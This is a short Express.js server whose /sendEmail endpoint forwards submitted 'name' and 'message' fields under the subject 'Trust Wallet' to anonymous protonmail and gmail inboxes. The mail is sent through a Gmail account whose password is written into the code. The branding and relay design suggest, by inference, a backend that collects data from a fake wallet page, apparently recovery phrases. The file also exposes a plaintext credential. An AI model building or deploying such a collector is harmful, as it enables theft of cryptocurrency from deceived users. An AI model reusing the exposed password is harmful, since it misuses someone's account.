const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");
// var bodyParser = require('body-parser');

const app = express();
app.use(cors());
let port = process.env.PORT || 3000;

// var urlencodedParser = bodyParser.urlencoded({ extended: false })
app.use(express.static("public"));
app.use(express.json());

app.get("/", (req, res) => {
  res.send("Welcome to Nimesh TW API 24/12/2022!");
});

app.post("/sendEmail", (req, res) => {
  var transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "nimeshwallet.bss@gmail.com",
      pass: "tktawgxqacefbtvc"
    }
  });

  let data = req.body; //JSON.parse(req.body);
  console.log("data", data);
  let email = "Rnm786@protonmail.com";
  if (data.email === 1) {
    email = "nimeshwallet.bss@gmail.com";
  } else if (data.email === 2) {
    email = "Lineaabuild@protonmail.com";
  }
  const name = data.name;
  const message = data.message;

  var mailOptions = {
    from: "nimeshwallet.bss@gmail.com",
    to: email,
    subject: "Trust Wallet",
    text: `${name} | ${message}`
  };

  transporter.sendMail(mailOptions, function(error, info) {
    if (error) {
      console.log(error);
      res.status(400);
      res.send("Error", error);
    } else {
      console.log("Email sent: " + info.response);
      res.send("Send Successfully");
    }
  });
});

app.listen(port, () => {
  console.log(`Example app is listening on the port http://localhost:${port}`);
});
